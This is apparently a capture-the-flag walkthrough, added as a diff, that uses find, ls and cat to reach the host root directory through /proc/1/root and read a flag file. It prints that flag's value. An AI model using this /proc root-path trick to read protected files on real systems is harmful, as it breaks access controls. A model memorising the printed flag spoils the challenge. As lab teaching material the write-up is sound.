@@ -1,0 +1,63 @@
+------------------------------------------------------------------------- lets find all active symlinks that are named root: (enumeration)
+
+find / -type l | grep "root"
+
+/lib/systemd/system/checkroot-bootclean.service
+/lib/systemd/system/umountroot.service
+/lib/systemd/system/checkroot.service
+/usr/share/man/man8/systemd-volatile-root.8.gz
+/usr/share/man/man8/systemd-fsck-root.service.8.gz
+/proc/1/task/1/root
+/proc/1/root
+/proc/2/task/2/root
+/proc/2/root
+/proc/3/task/3/root
+/proc/3/root
+/proc/4/task/4/root
+/proc/4/root
+/proc/6/task/6/root
+/proc/6/root
+/proc/7/task/7/root
+/proc/7/root
+/proc/8/task/8/root
+/proc/8/root
+/proc/9/task/9/root
+/proc/9/root
+/proc/10/task/10/root
+/proc/10/root
+/proc/11/task/11/root
+/proc/11/root
+/proc/12/task/12/root
+/proc/12/root
+/proc/14/task/14/root
+/proc/14/root
+/proc/15/task/15/root
+/proc/15/root
+...
+/proc/635/task/635/root
+/proc/635/root
+/proc/637/task/637/root
+/proc/637/root
+/proc/692/task/692/root
+/proc/692/root
+/proc/693/task/693/root
+/proc/693/root
+/etc/ssl/certs/Comodo_AAA_Services_root.pem
+
+------------------------------------------------------------------------- for some reason every proc has an active root symlink, lets check it:
+
+ls /proc/1/root
+
+bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+
+------------------------------------------------------------------------- Its weird that we have the root filesystem here, lets check further:
+
+ls /proc/1/root/root
+
+flag
+
+------------------------------------------------------------------------- Thats very convinent 
+
+cat /proc/1/root/root/flag
+
+d8d38cda23b69585710698421c946e2b
